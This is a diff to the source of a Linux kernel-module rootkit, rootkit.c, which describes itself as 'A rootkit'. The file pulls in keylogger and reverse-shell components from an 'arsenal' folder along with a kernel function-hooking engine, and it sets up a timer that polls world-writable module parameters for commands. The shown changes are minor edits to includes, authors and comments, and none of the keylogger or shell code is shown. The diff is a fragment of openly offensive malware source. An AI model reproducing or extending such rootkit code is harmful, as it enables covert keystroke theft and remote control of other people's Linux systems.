@@ -1,15 +1,14 @@
 /**
  * @file    rootkit.c
- * @author  Aaron Lichtman, Arch Gupta  and Brandon Weidner
+ * @author  Aaron Lichtman, Arch Gupta
  * @brief   A rootkit. TODO: Expand description
  */
 #include <linux/fs.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
-// #include <linux/timer.h>
-// #include <linux/jiffies.h>
-#include <linux/delay.h>
+#include <linux/timer.h>
+#include <linux/jiffies.h>
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
 #include "khook/engine.c"
@@ -18,7 +17,7 @@ MODULE_AUTHOR("Aaron Lichtman");
 MODULE_AUTHOR("Arch Gupta");
 MODULE_DESCRIPTION("Linux rootkit.");
 MODULE_VERSION("0.1");
-MODULE_LICENSE("GPL");
+MODULE_LICENSE("GPL"); // So the kernel doesn't complain about proprietary code
 
 /**
  * Data structures
@@ -47,7 +46,6 @@ struct commands {
 #define POLLING_INTERVAL 300
 static _timer polling_timer;
 struct commands cmds;
-
 
 /**
  * Module parameters are made writable by anyone.
@@ -154,7 +152,7 @@ __inline static void timer_cleanup_wrapper(_timer *timer) {
  * Check all parameters against last-known values and see if anything changed.
  * If yes, take the requested action.
  * Finally, start a timer to call this function again in the future.
- * NOTE: The data parameter is required.
+ * NOTE: The data parameter is required in order for this to compile.
  */
 static void poll_for_commands(unsigned long data) {
     // TODO: Store previous values of variables somewhere.
